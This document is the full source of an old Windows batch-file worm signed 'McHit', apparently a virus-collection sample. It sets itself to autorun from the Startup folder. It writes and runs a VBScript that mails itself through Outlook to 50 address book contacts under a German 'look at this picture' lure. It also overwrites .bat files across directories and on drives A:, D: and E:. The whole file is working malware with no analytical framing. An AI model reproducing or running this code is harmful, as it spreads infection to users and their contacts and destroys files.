@echo off
REM BAT/Without.c
REM by McHit
:AutoSt
copy %0 %WinDir%\Startm~1\Progra~1\Autost~1\WinStart.bat

:Worming
:eMailWorming

copy %0 C:\Without.bat
copy %0 C:\send.vbs 
echo Dim x > C:\send.vbs
echo.on error resume next >> C:\send.vbs

echo Set so=CreateObject("Scripting.FileSystemObject") >> C:\send.vbs
echo Set ol=CreateObject("Outlook.Application") >> C:\send.vbs
echo For x=1 To 50 >> C:\send.vbs
echo Set Mail=ol.CreateItem(0) >> C:\send.vbs
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\send.vbs
echo Mail.Subject="Hi!!" >> C:\send.vbs
echo Mail.Body="Hi! Guck dir mal das kranke Bild an! ;-)" >> C:\send.vbs
echo Mail.Attachments.Add("C:\without.bat") >> C:\send.vbs
echo Mail.Send >> C:\send.vbs
echo Next >> C:\send.vbs
echo ol.Quit >> C:\send.vbs
cscript C:\send.vbs //B

:ComputerWorming
copy %0 %WinDir%\Desktop\*.bat
copy %0 C:\*.bat
cd..
copy %0 *.bat
cd..
copy %0 *.bat
cd..
copy %0 *.bat
cd..
copy %0 *.bat


:DiskWorming
copy %0 A:\*.bat
copy %0 D:\*.bat
copy %0 E:\*.bat
ctty CON